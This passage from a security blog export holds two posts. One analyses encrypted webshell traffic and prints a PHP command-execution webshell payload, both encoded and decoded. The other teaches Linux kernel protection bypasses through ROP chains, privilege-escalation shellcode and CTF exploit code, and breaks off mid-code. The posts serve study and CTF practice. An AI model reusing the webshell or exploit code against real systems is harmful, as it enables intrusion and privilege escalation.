lbABSk2HNfwhOAGzrF+iInJCz1vOsFfM4ZyMz8v7b5E9S7559A11uAr4Z3crYz8fArkfnW7RV4w5JMSPVAltoecdujNYwsoL7+Qbb7X4EaYLpcrRLKrsUg7mXX7cc3GhAB4Wh7tqLFQw4CbMaKvmweImDdRelY3r5TjxCCROAfMTRGGiRhlopX7yw8CF+5c1cAR6PPJaMYSSztRRCok+cOkhD4pLeUEgRCuafwMQB350BfspEYONdr6Z7+hLgYNNEJa9cg4X7PKNB7OBwJ+//R/fFNG4xf3L5miXeJY2JaiHuA7duJH6kUpBfGq7jS+knRz/8azOc2n9TH/8J74h6wr8kHdStHAPgA7wetx+tqL4Y6CUGM3Hwuv4VpB2ZgQv/427BYRQ41nrPhMhYnAfFqIMpb1QfyLfB199FTzOkTYb20jHZolby3ZQUrWp5G2WOUmdg6/CNOoABPQWLJbiEurOQK7cR35pGr5XEix0UpfI3BvR8z+fGNAwxbVWAT/A3ZK1KLllQdkAJt8x+nUShictq2xUmZN3PPCaBtpSYDFrGdPAp+Gof69u2Eb6WH89pxNhA53tAWHUi2+0ExN4g/ZJUjfAtZqICWQKdCcmEaBkh/6v7mFqMmHon4THlcabBobb+Lp7EO6IntTWVrCdx4+oMpoEQKq5TZd0IIGEmxSJrrwel6r/gorqY0NTCE2i0yQ0MHxdgGQj6/ZA5+8Ani6/AMkeNF7DGeozFr53NycnWO6wFeXmoBeJ2w2Hmj0RVecPwU809v+hOxL45Tn6g9ZSSG7hFZJkUVjD0NO3u3hhcN65wbPsILHJZpTo/KiocBy2S1+j747iMfzKmgmqsBcI1y+Vx3C/5Km2rsaagSSxXQx1eqTF3Y07Aq4h5SJp5x3eHm50WCC2Iyh7Vb37+a9jrFu76U+1AiwMM8pYCLWIxrYbcU/wo2eLnpWlRnGEUrtijjdrwegXDCAiEqvhqp11DUU3KUy5UwfcPZeeMo5a5T32TVbWDX2eyMCNXMyx5UzCpspxh4Qj+SWgaXswoIab5Gx5rq7h8lJNL9P2/js0D7VgO1AwdeUI8RmsK1TygwQBGHu92S2/PR1YTzQ3dB5U9mwLM2nUxi0U0BrHI/4hh/Ilpw4msZNk69IlpXcfNyPvVFKxZaU=\nASE加密模式CBC，填充：okcs7padding，密钥长度：128位，密钥：a02439ec229d8be0：\nPssert|eval(base64_decode('QGVycm9yX3JlcG9ydGluZygwKTsNCg0KZnVuY3Rpb24gZ2V0U2FmZVN0cigkc3RyKXsNCiAgICAkczEgPSBpY29udigndXRmLTgnLCdnYmsvL0lHTk9SRScsJHN0cik7DQogICAgJHMwID0gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzMSk7DQogICAgaWYoJHMwID09ICRzdHIpew0KICAgICAgICByZXR1cm4gJHMwOw0KICAgIH1lbHNlew0KICAgICAgICByZXR1cm4gaWNvbnYoJ2diaycsJ3V0Zi04Ly9JR05PUkUnLCRzdHIpOw0KICAgIH0NCn0NCmZ1bmN0aW9uIG1haW4oJGNtZCwkcGF0aCkNCnsNCiAgICBAc2V0X3RpbWVfbGltaXQoMCk7DQogICAgQGlnbm9yZV91c2VyX2Fib3J0KDEpOw0KICAgIEBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLCAwKTsNCiAgICAkcmVzdWx0ID0gYXJyYXkoKTsNCiAgICAkUGFkdEpuID0gQGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7DQogICAgaWYgKCEgZW1wdHkoJFBhZHRKbikpIHsNCiAgICAgICAgJFBhZHRKbiA9IHByZWdfcmVwbGFjZSgnL1ssIF0rLycsICcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBleHBsb2RlKCcsJywgJFBhZHRKbik7DQogICAgICAgICRQYWR0Sm4gPSBhcnJheV9tYXAoJ3RyaW0nLCAkUGFkdEpuKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkUGFkdEpuID0gYXJyYXkoKTsNCiAgICB9DQogICAgJGMgPSAkY21kOw0KICAgIGlmIChGQUxTRSAhPT0gc3RycG9zKHN0cnRvbG93ZXIoUEhQX09TKSwgJ3dpbicpKSB7DQogICAgICAgICRjID0gJGMgLiAiIDI+JjFcbiI7DQogICAgfQ0KICAgICRKdWVRREJIID0gJ2lzX2NhbGxhYmxlJzsNCiAgICAkQnZjZSA9ICdpbl9hcnJheSc7DQogICAgaWYgKCRKdWVRREJIKCdzeXN0ZW0nKSBhbmQgISAkQnZjZSgnc3lzdGVtJywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgc3lzdGVtKCRjKTsNCiAgICAgICAgJGtXSlcgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICAgICAgb2JfZW5kX2NsZWFuKCk7DQogICAgfSBlbHNlIGlmICgkSnVlUURCSCgncHJvY19vcGVuJykgYW5kICEgJEJ2Y2UoJ3Byb2Nfb3BlbicsICRQYWR0Sm4pKSB7DQogICAgICAgICRoYW5kbGUgPSBwcm9jX29wZW4oJGMsIGFycmF5KA0KICAgICAgICAgICAgYXJyYXkoDQogICAgICAgICAgICAgICAgJ3BpcGUnLA0KICAgICAgICAgICAgICAgICdyJw0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgIGFycmF5KA0KICAgICAgICAgICAgICAgICdwaXBlJywNCiAgICAgICAgICAgICAgICAndycNCiAgICAgICAgICAgICksDQogICAgICAgICAgICBhcnJheSgNCiAgICAgICAgICAgICAgICAncGlwZScsDQogICAgICAgICAgICAgICAgJ3cnDQogICAgICAgICAgICApDQogICAgICAgICksICRwaXBlcyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgd2hpbGUgKCEgZmVvZigkcGlwZXNbMV0pKSB7DQogICAgICAgICAgICAka1dKVyAuPSBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KICAgICAgICB9DQogICAgICAgIEBwcm9jX2Nsb3NlKCRoYW5kbGUpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ3Bhc3N0aHJ1JykgYW5kICEgJEJ2Y2UoJ3Bhc3N0aHJ1JywgJFBhZHRKbikpIHsNCiAgICAgICAgb2Jfc3RhcnQoKTsNCiAgICAgICAgcGFzc3RocnUoJGMpOw0KICAgICAgICAka1dKVyA9IG9iX2dldF9jb250ZW50cygpOw0KICAgICAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdzaGVsbF9leGVjJykgYW5kICEgJEJ2Y2UoJ3NoZWxsX2V4ZWMnLCAkUGFkdEpuKSkgew0KICAgICAgICAka1dKVyA9IHNoZWxsX2V4ZWMoJGMpOw0KICAgIH0gZWxzZSBpZiAoJEp1ZVFEQkgoJ2V4ZWMnKSBhbmQgISAkQnZjZSgnZXhlYycsICRQYWR0Sm4pKSB7DQogICAgICAgICRrV0pXID0gYXJyYXkoKTsNCiAgICAgICAgZXhlYygkYywgJGtXSlcpOw0KICAgICAgICAka1dKVyA9IGpvaW4oY2hyKDEwKSwgJGtXSlcpIC4gY2hyKDEwKTsNCiAgICB9IGVsc2UgaWYgKCRKdWVRREJIKCdleGVjJykgYW5kICEgJEJ2Y2UoJ3BvcGVuJywgJFBhZHRKbikpIHsNCiAgICAgICAgJGZwID0gcG9wZW4oJGMsICdyJyk7DQogICAgICAgICRrV0pXID0gTlVMTDsNCiAgICAgICAgaWYgKGlzX3Jlc291cmNlKCRmcCkpIHsNCiAgICAgICAgICAgIHdoaWxlICghIGZlb2YoJGZwKSkgew0KICAgICAgICAgICAgICAgICRrV0pXIC49IGZyZWFkKCRmcCwgMTAyNCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgQHBjbG9zZSgkZnApOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRrV0pXID0gMDsNCiAgICAgICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJmYWlsIik7DQogICAgICAgICRyZXN1bHRbIm1zZyJdID0gYmFzZTY0X2VuY29kZSgibm9uZSBvZiBwcm9jX29wZW4vcGFzc3RocnUvc2hlbGxfZXhlYy9leGVjL2V4ZWMgaXMgYXZhaWxhYmxlIik7DQogICAgICAgICRrZXkgPSAkX1NFU1NJT05bJ2snXTsNCiAgICAgICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCAka2V5KTsNCiAgICAgICAgcmV0dXJuOw0KICAgICAgICANCiAgICB9DQogICAgJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKGdldFNhZmVTdHIoJGtXSlcpKTsNCiAgICBlY2hvIGVuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCksICAkX1NFU1NJT05bJ2snXSk7DQp9DQoNCmZ1bmN0aW9uIGVuY3J5cHQoJGRhdGEsJGtleSkNCnsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQ0KICAgIAl7DQogICAgCQlmb3IoJGk9MDskaTxzdHJsZW4oJGRhdGEpOyRpKyspIHsNCiAgICAJCQkgJGRhdGFbJGldID0gJGRhdGFbJGldXiRrZXlbJGkrMSYxNV07IA0KICAgIAkJCX0NCgkJCXJldHVybiAkZGF0YTsNCiAgICAJfQ0KICAgIGVsc2UNCiAgICAJew0KICAgIAkJcmV0dXJuIG9wZW5zc2xfZW5jcnlwdCgkZGF0YSwgIkFFUzEyOCIsICRrZXkpOw0KICAgIAl9DQp9JGNtZD0iWTJRZ0wyUWdJa1E2WEhCb2NITjBkV1I1WDNCeWIxeFhWMWRjSWlaM2FHOWhiV2s9IjskY21kPWJhc2U2NF9kZWNvZGUoJGNtZCk7JHBhdGg9IlJEb3ZjR2h3YzNSMVpIbGZjSEp2TDFkWFZ5OD0iOyRwYXRoPWJhc2U2NF9kZWNvZGUoJHBhdGgpOw0KbWFpbigkY21kLCRwYXRoKTs='));\n将内容base64解密：\n@error_reporting(0);\n\nfunction getSafeStr($str){\n    $s1 = iconv('utf-8','gbk//IGNORE',$str);\n    $s0 = iconv('gbk','utf-8//IGNORE',$s1);\n    if($s0 == $str){\n        return $s0;\n    }else{\n        return iconv('gbk','utf-8//IGNORE',$str);\n    }\n}\nfunction main($cmd,$path)\n{\n    @set_time_limit(0);\n    @ignore_user_abort(1);\n    @ini_set('max_execution_time', 0);\n    $result = array();\n    $PadtJn = @ini_get('disable_functions');\n    if (! empty($PadtJn)) {\n        $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);\n        $PadtJn = explode(',', $PadtJn);\n        $PadtJn = array_map('trim', $PadtJn);\n    } else {\n        $PadtJn = array();\n    }\n    $c = $cmd;\n    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {\n        $c = $c . \" 2&gt;&amp;1\\n\";\n    }\n    $JueQDBH = 'is_callable';\n    $Bvce = 'in_array';\n    if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) {\n        ob_start();\n        system($c);\n        $kWJW = ob_get_contents();\n        ob_end_clean();\n    } else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) {\n        $handle = proc_open($c, array(\n            array(\n                'pipe',\n                'r'\n            ),\n            array(\n                'pipe',\n                'w'\n            ),\n            array(\n                'pipe',\n                'w'\n            )\n        ), $pipes);\n        $kWJW = NULL;\n        while (! feof($pipes[1])) {\n            $kWJW .= fread($pipes[1], 1024);\n        }\n        @proc_close($handle);\n    } else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) {\n        ob_start();\n        passthru($c);\n        $kWJW = ob_get_contents();\n        ob_end_clean();\n    } else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) {\n        $kWJW = shell_exec($c);\n    } else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) {\n        $kWJW = array();\n        exec($c, $kWJW);\n        $kWJW = join(chr(10), $kWJW) . chr(10);\n    } else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) {\n        $fp = popen($c, 'r');\n        $kWJW = NULL;\n        if (is_resource($fp)) {\n            while (! feof($fp)) {\n                $kWJW .= fread($fp, 1024);\n            }\n        }\n        @pclose($fp);\n    } else {\n        $kWJW = 0;\n        $result[\"status\"] = base64_encode(\"fail\");\n        $result[\"msg\"] = base64_encode(\"none of proc_open/passthru/shell_exec/exec/exec is available\");\n        $key = $_SESSION['k'];\n        echo encrypt(json_encode($result), $key);\n        return;\n        \n    }\n    $result[\"status\"] = base64_encode(\"success\");\n    $result[\"msg\"] = base64_encode(getSafeStr($kWJW));\n    echo encrypt(json_encode($result),  $_SESSION['k']);\n}\n\nfunction encrypt($data,$key)\n{\n\tif(!extension_loaded('openssl'))\n    \t{\n    \t\tfor($i=0;$i&lt;strlen($data);$i++) {\n    \t\t\t $data[$i] = $data[$i]^$key[$i+1&amp;15]; \n    \t\t\t}\n\t\t\treturn $data;\n    \t}\n    else\n    \t{\n    \t\treturn openssl_encrypt($data, \"AES128\", $key);\n    \t}\n}$cmd=\"Y2QgL2QgIkQ6XHBocHN0dWR5X3Byb1xXV1dcIiZ3aG9hbWk=\";$cmd=base64_decode($cmd);$path=\"RDovcGhwc3R1ZHlfcHJvL1dXVy8=\";$path=base64_decode($path);\nmain($cmd,$path);\n而cmd内容即为执行内容：\ncd /d \"D:\\phpstudy_pro\\WWW\\\"&amp;whoami\n小小总结这些webshell被大家所使用不仅仅是在当时出现时可绕过大部分流量检测，独特的请求方式，和免杀，还有他们与时俱进的各种功能，内网穿透、内存马等等，实现一键去日内网，随着检测手段加强和内网利用手段的增多，相信也会有新的绕过方法和功能出现。\n参考链接：https://www.freebuf.com/sectool/285693.html\nhttps://xz.aliyun.com/t/10556\nhttp://www.wjhsh.net/0daybug-p-12004574.html\n\n","slug":"Webshell工具加密流量解析","date":"2022-07-19T11:48:45.000Z","categories_index":"渗透测试","tags_index":"","author_index":"RainSec"},{"id":"ca9ebcc3809bcde27e81d904c30455e1","title":"Linux Kernel 保护机制绕过","content":"Linux Kernel 保护机制绕过\n\n\n\n\n\n\n\n\n好久没搞kernel的洞了，最近分析的这方面的洞有点多，相关的Exp任务也比较多，因此学习总结一下方便查找和记忆。\nSMEP + KPTI bypass​        SMEP是SupervisorModeExecutionPrevention的缩写，主要的作用其实就是抵御类似ret2user这样的攻击，简单来说就是阻止内核执行用户态传递的代码。\n​        检测计算机是否开启SMEP保护的方式很简单，cat /proc/cpuinfo | grep smep，如果有匹配到一些信息的话就说明计算机开启了SMEP保护。在CTF赛事中一般会给一些kernel启动的sh脚本，从这些脚本里面我们也可以看出虚拟机在启动kernel时是否开启了SMEP保护：\n#!/bin/sh\n\nqemu-system-x86_64 -initrd initramfs.cpio \\\n-kernel bzImage \\\n-append 'console=ttyS0 oops=panic panic=1 nokaslr' \\\n-monitor /dev/null \\\n-m 64M --nographic \\\n-smp cores=1,threads=1 \\\n\n这里是没开启SMEP的脚本，如果在脚本里面加入SMEP相关的cpu参数那么就是开启了SMEP机制。\n#!/bin/sh\n\nqemu-system-x86_64 -initrd initramfs.cpio \\\n-kernel bzImage \\\n-append 'console=ttyS0 oops=panic panic=1 nokaslr' \\\n-monitor /dev/null \\\n-m 64M --nographic \\\n-smp cores=1,threads=1 \\\n-cpu kvm64,smep\n\n还有一种判断SMEP机制是否开启的方法是通过cr4寄存器的值：\n第20位代表的就是SMEP机制是否开启，获取cr4寄存器值的方法也很简单，一种可以通过debuger去attach要调试的kernel，另一种就是通过触发SMEP机制的crash\n​        KPTI机制更多的是一种页表隔离的机制，当在用户态和内核态之间进行状态切换的时候KPTI机制会尽量减少用户态页表中的内核地址，同时内核页表中所有的用户态页都被设置为NX使得用户态的页不具备可执行权限，这是一种防范Meltdown类似攻击的机制。\n​        检测KPTI机制是否开启的方法有很多，cat /proc/cpuinfo | grep pti或者类似上面说到的cpu参数-cpu kvm64,smep，或者检查进程页表，但是这需要你可以查看物理内存，通过内核任意读取的原语可以做到，但是需要进行虚拟地址和物理地址之间的转换，这就需要你具备一定的内存管理知识和多级页表相关知识，这些基础知识这里就不细说了，下面举例一些demo看如何获取相关物理地址。\nvoid *pgd = get_current()-&gt;mm-&gt;pgd;\n\nget_current() 会帮助获取当前的task_struct，然后得到mm_struct结构体类型的mm成员，所有的进程地址空间都包含该结构体里面，其中pgd字段代表的是全局页目录，拿到地址之后进行页表地址转换就可以拿到对应的物理地址，那么在多级页表的处理过程中可以拿到每一级页表的入口地址，该地址的NX bit就表明该页表是否开启了NX，结论就是，正常情况下每一级页表的NX位是没设置的，但是全局页目录设置了NX bit，因为在多级页表解析的过程中全局页目录是共享的。\nROP绕过​        内核里面的rop和用户态其实是非常相似的，做rop最基本的就是先获取到vmlinux，以ctf赛题来说一般提供的都是压缩后的bzImage，这里可以通过vmlinux-to-elf工具来实现解压缩：\n./vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;\n\n然后通过ROPgadget或者ropper从vmlinux里面获取gadget\nROPgadget --binary vmlinux &gt; gadgets\n\ngadget的寻找原则其实不是固定的，要看场景丁需求，不过类似mov esp, 0xf7000000 ; ret这样的一般都很不错（注意常量一定要对齐），可以将esp指向我们分配的地址然后接下来的ret操作就容易被控制进而执行rop链。但是ROPgadget是不会检查相关段是否开启了NX的。\n​        对于SMEP来说，它由cr4寄存器控制，因此可以通过改变cr4寄存器的第20 bit的值来进行绕过，比如使用native_write_cr4函数：\nvoid native_write_cr4(unsigned long val)\n{\n\tunsigned long bits_missing = 0;\n\nset_register:\n\tasm volatile(\"mov %0,%%cr4\": \"+r\" (val), \"+m\" (cr4_pinned_bits));\n\n\tif (static_branch_likely(&amp;cr_pinning)) {\n\t\tif (unlikely((val &amp; cr4_pinned_bits) != cr4_pinned_bits)) {\n\t\t\tbits_missing = ~val &amp; cr4_pinned_bits;\n\t\t\tval |= bits_missing;\n\t\t\tgoto set_register;\n\t\t}\n\t\t/* Warn after we've set the missing bits. */\n\t\tWARN_ONCE(bits_missing, \"CR4 bits went missing: %lx!?\\n\",\n\t\t\t  bits_missing);\n\t}\n}\nEXPORT_SYMBOL(native_write_cr4);\n\n但是从代码里面的警告就可以看出，在较新版本的内核中，该函数已经不能改变第20bit和第21bit的值了，\n​        对于KPTI就比较麻烦了，一种方法是如果具备内核任意读写和当前进程页表的地址，那么就可以直接通过关闭NX bit来实现，但是都任意读写了，直接修改cred结构体可能会更香一点。那么最好的方式其实应该去利用kernel本身的代码来帮助实现这一绕过过程，下面是kernel entry的部分代码，主要是用于内核态到用户态的切换，这其实很符合exp的需求，原本exp不能成功执行的主要原因就是在返回用户态之后执行的代码所在页其实属于内核，这个切换它成功的进行了页表切换，因接下来用到的就是用户态的页表，。\nGLOBAL(swapgs_restore_regs_and_return_to_usermode)\n#ifdef CONFIG_DEBUG_ENTRY\n\t/* Assert that pt_regs indicates user mode. */\n\ttestb\t$3, CS(%rsp)\n\tjnz\t1f\n\tud2\n1:\n#endif\n\tPOP_REGS pop_rdi=0\n\n\t/*\n\t * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.\n\t * Save old stack pointer and switch to trampoline stack.\n\t */\n\tmovq\t%rsp, %rdi\n\tmovq\tPER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp\n\n\t/* Copy the IRET frame to the trampoline stack. */\n\tpushq\t6*8(%rdi)\t/* SS */\n\tpushq\t5*8(%rdi)\t/* RSP */\n\tpushq\t4*8(%rdi)\t/* EFLAGS */\n\tpushq\t3*8(%rdi)\t/* CS */\n\tpushq\t2*8(%rdi)\t/* RIP */\n\n\t/* Push user RDI on the trampoline stack. */\n\tpushq\t(%rdi)\n\n\t/*\n\t * We are on the trampoline stack.  All regs except RDI are live.\n\t * We can do future final exit work right here.\n\t */\n\tSTACKLEAK_ERASE_NOCLOBBER\n\n\tSWITCH_TO_USER_CR3_STACK scratch_reg=%rdi\n\n\t/* Restore RDI. */\n\tpopq\t%rdi\n\tSWAPGS\n\tINTERRUPT_RETURN\n\n到此，其实就不难理解为什么kernel exp里面很多类似这样的ROP code:\npivot_stack[0] = 0xcafedeadbeef;\n\npivot_stack[i++] = pop_rdi;\npivot_stack[i++] = 0;\npivot_stack[i++] = prepare_kernel_cred;\npivot_stack[i++] = pop_rdx;\npivot_stack[i++] = 8;\npivot_stack[i++] = cmp;\npivot_stack[i++] = mov_rdi_rax;\npivot_stack[i++] = commit_creds;\n\npivot_stack[i++] = kpti_trampoline;\npivot_stack[i++] = 0x12345678; // RAX\npivot_stack[i++] = 0x87654321; // RDI\npivot_stack[i++] = (unsigned long)u_code; //userspace_rip;\npivot_stack[i++] = 0x33; //userspace_cs;\npivot_stack[i++] = 0x246; //userspace_rflags;\npivot_stack[i++] = (unsigned long)u_stack; //userspace_rsp;\npivot_stack[i++] = 0x2b; //userspace_ss;\n\n至于最开始的0xcafedeadbeef，这其实是为了触发page fault handler，因此根据linux demand-on-paging的原则，只有触发该handler的情况下才会真正mmaping。\n​        还有一种方法是通过signal handler。\nget root​        获取root权限的方式在内核里面还算比较统一的，基本很多都是通过\n\ncommit_creds(prepare_kernel_cred(0))。\n确定cred structure结构体的地址来进行权限提升。\nctf里面可能会用到的方法就是通过chmod 修改flag文件为777权限然后挂起，然后通过用户空间的一个进程来读取文件内容。\n\n​    那么shellcode的写法就比较直接了，假设通过cat /proc/kallsyms得到了grep commit_creds和grep prepare_kernel_cred的地址：\nxor rdi, rdi\nmov rcx, prepare_kernel_cred_addr\ncall rcx\nmov rdi, rax\nmov rcx, commit_creds_addr\ncall rcx\nret\n\n这种shellcode没有做内核地址空间与用户地址空间的转换，因此可能比较局限，适用于仅仅存在一个retun 0类似指令的目标函数。为了适配更多的场景，需要做内核态和用户态的上下文切换，在linux kernel 源码中详细介绍了如何进入内核态：\n\n\n\n\n\n\n\n\n\n64-bit SYSCALL saves rip to rcx, clears rflags.RF, then saves rflags to r11,then loads new ss, cs, and rip from previously programmed MSRs.rflags gets masked by a value from another MSR (so CLD and CLACare not needed). SYSCALL does not save anything on the stackand does not change rsp.\n注：MSR\n从内核态返回用户态可以通过Linux提供的一些指令SYSRET，SYSEXIT，IRET，其中SYSRET和IRET可以适用于所有的CPU供应商，并且被包含在x86_64的标准里面，SYSRET需要利用MSR特殊读写指令因而较为麻烦，因此一般采用IRET。该指令的含义就是从中断返回，通过查看AMD64手册可以看出在保护模式下IRET对应IRETQ，那么我们只需要在执行IRETQ之前按顺序放置好RIP, CS, RFLAGS, RSP, SS，最后还需要知道的时候swapgs指令，它的语义是：Exchange GS base with KernelGSBase MSR，在linux syscall entry的代码哪里也存在该指令的调用，因此在通过system call返回用户空间的时候我们需要再做一次swapgs用于恢复GS。\nswapgs\n\npush userspace_ss\npush userspace_rsp\npush userspace_rflags\npush userspace_cs\npush userspace_rip\niretq\n\n​        还有一种方法就是上述的第三条，第一步需要先找到chmod func的地址：\n\n可以看到__x64_sys_chmod的地址是0xffffffff872dacf0，在内核调试中对该地址下断点就可以得到该如何给它附加参数：\nmovzx  edx, word ptr [rdi + 0x68]\nmov    rsi, qword ptr [rdi + 0x70]\nmov    edi, 0xffffff9c\ncall   0xffffffff811a1b50\n\n不过要记得，/flag字符串存放地址应该使用内核空间地址，同时由于Linux kernel本身采用的是Non-Preemptive Threading Model，因此在kernel thred的执行过程中一般不会进行上下文切换，除非调用了特殊的API，通过sleep当前thread其实就是一个很好的迫使kernel进行上下文切换的，当然kernel里面的sleep和用户态有很大的差别，需要调用不同的API，这里我选择的是msleep():\n\n那么，完整的shellcode就有了：\n; commit_cred(prepare_kernel_creds(0))\nxor rdi, rdi\nmov rcx, prepare_kernel_cred_addr\ncall rcx\nmov rdi, rax\nmov rcx, commit_creds_addr\ncall rcx\n\n; chmod 777 flag\nmov r15, 0x67616c662f\nmov r14, 0xdeadf00\nmov [r14], r15\nmov rdi, 0xffffff9c\nmov rsi, r14\nmov rdx, 0777\nmov rcx, x64_chmod_addr\ncall rcx\n\n; msleep(0x1000000)\nmov rdi, 0x1000000\nmov rcx, msleep_addr\ncall rcx\nint 3\n\n然后我们让exp在后台执行，前台执行cat flag实现文件读取。\n总结​        在通过ROP编写shellcode的时候要注意两点：\n\n在exp中的mmap产生的shellcode地址不在之前kernel访问的页表里面，那么在执行的时候就会触发double fault。\n栈指针必须在向上向下两个方向上都还剩比较宽阔的空间unsigned long *pivot_stack = mmap((void *)0xf7000000-0x1000, 0x1000+0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);，因为Linux kernel func 比如 commit_creds需要使用栈空间并且不能使用低于0xf7000000大小的地址，否则会引起uncatchable page fault，MAP_GROWSDOWN是无效的，因为它只能用于用户态。\n\nSMEP+PTI+SMAP+KASLR bypass\n\n\n\n\n\n\n\n\nKASLR就不多解释了，就是一个kernel的地址随机化\nSMAP​        SMAP是Supervisor Mode Access Prevention，它使得用户态的指针无法在内核态被解引用，这无疑会使得ROP难以有效使用。\n​        在qemu里面-cpu kvm64,smep,smap表明开启了SMAP机制，当然cat /proc/cpuinfo | grep smap也可以看出来。\nSMAP bypass​        通过分析linux kernel的mmap实现其实就可以知道我们可以通过类似linux kernel heap spray的方式将用户空间的代码映射到内核里面，只需要用MAP_POPULATE的flag:\nMAP_POPULATE (since Linux 2.5.46)\n       Populate (prefault) page tables for a mapping.  For a file mapping, this causes read-ahead on the file.  This will help to reduce blocking on page faults later.  The mmap() call doesn't fail if the mapping cannot be populated (for example, due to limitations on the number of mapped huge pages when using MAP_HUGETLB).  MAP_POPULATE is supported for private mappings only since Linux 2.6.23.\n\n这是因为在通过该flag进行mmap的时候，物理页也会同时被映射而不是想之前按需映射的方式。下面是一个github提供的demo可以测算可mmap的地址大小：\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/fcntl.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;sys/stat.h&gt;\n\nint main (int argc, char **argv){\n\tint cnt = 0;\n\tvoid *pg;\n\n\twhile(1) {\n\t\tpg = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);\n\t\tif (pg == MAP_FAILED) {\n\t\t\tperror(\"mmap\");\n\t\t\tbreak;\n\t\t}\n\t\telse {\n\t\t\tcnt++;\n\t\t\tif (cnt % 1000 == 0) {\n\t\t\t\tprintf(\"[*] allocated %d pages, asking for more...\\n\", cnt);\n\t\t\t}\n\t\t}\n\t}\n\n\tprintf(\"[*] number of pages allocated: %d\\n\", cnt);\n\treturn 0;\n}\n\n通过实验得出结论就是尽管RAM很小，但是最大mmap的值是它的数倍，同时该值会根据内存资源的大小来发生变化。同时物理页的分配有一个特点，那就是它们一般都是连续分配的。如此通过大量的mmap地址并填充信息，最终其实是可以在内核里面访问到这些信息的，如此就可以绕过SMAP的保护，因为我们不需要再解析用户态的指针，而是通过内核地址进行代码执行。\n​        那么应该如何获得物理地址呢？通过文档发现，在Linux中每一个进程都维护一个指针mm_struct-&gt;pgd指向该进程的**Page Global Directory (PGD)**，表里面包含的是pgd_t数组，pgd_t定义在asm/page.h里面根据不同的架构拥有不同的值，在x86架构下mm_struct-&gt;pgd会被复制到cr3寄存器。\n\n​        可以知道通过mmap拿到的是虚拟地址，因此需要做一个虚拟地址到屋里地址之间的转换，那么如何获取cr3或者说pgd的值呢，一方面可以通过内核获取另一方面可以通过/proc/(pid)/pagemap获取，还有一种很奇特的方法即是通过映射64bit的[39:48]形成的地址，这里一共是0xff个地址，此时在物理页表中就会生成大量稠密的地址，这些地址会有一些特征，比如：\n\n最高位为1。\n最低字节为0x67。\n\n那么就可以通过遍历内核地址（一般从pageOffsetBase + (0x7c000 &lt;&lt; 12)开始）中的值来判断是否符合自己刚才通过spraying注入的大量地址，如果一个地址的内容符合自己注入的地址，同时索引0x100的结果为0，那么基本就能确定PGD的地址了。\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/fcntl.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;string.h&gt;\n\n#define VULN_READ 0x1111\n#define VULN_WRITE 0x2222\n#define VULN_STACK 0x3333\n#define VULN_PGD 0x4444\n#define VULN_PB 0x5555\n\n#define SPRAY_CNT 0x10000\n\nstruct rwRequest {\n\tvoid *kaddr;\n\tvoid *uaddr;\n\tsize_t length;\n};\n\nunsigned long pageOffsetBase = 0xffff888000000000;\n\nint Open(char *fname, int mode) {\n\tint fd;\n\tif ((fd = open(fname, mode)) &lt; 0) {\n\t\tperror(\"open\");\n\t\texit(-1);\n\t}\n\treturn fd;\n}\n\nvoid write64(unsigned long kaddr, unsigned long value) {\n\n\tstruct rwRequest req;\n\tunsigned long value_ = value;\n\n\treq.uaddr = &amp;value_;\n\treq.length = 8;\n\treq.kaddr = (void *)kaddr;\n\n\tint fd = Open(\"/dev/vuln\", O_RDONLY);\n\n\tif (ioctl(fd, VULN_WRITE, &amp;req) &lt; 0) {\n\t\tperror(\"ioctl\");\n\t\texit(-1);\n\t}\n}\n\nunsigned long read64(unsigned long kaddr) {\n\n\tstruct rwRequest req;\n\tunsigned long value;;\n\n\treq.uaddr = &amp;value;\n\treq.length = 8;\n\treq.kaddr = (void *)kaddr;\n\n\tint fd = Open(\"/dev/vuln\", O_RDONLY);\n\n\tif (ioctl(fd, VULN_READ, &amp;req) &lt; 0) 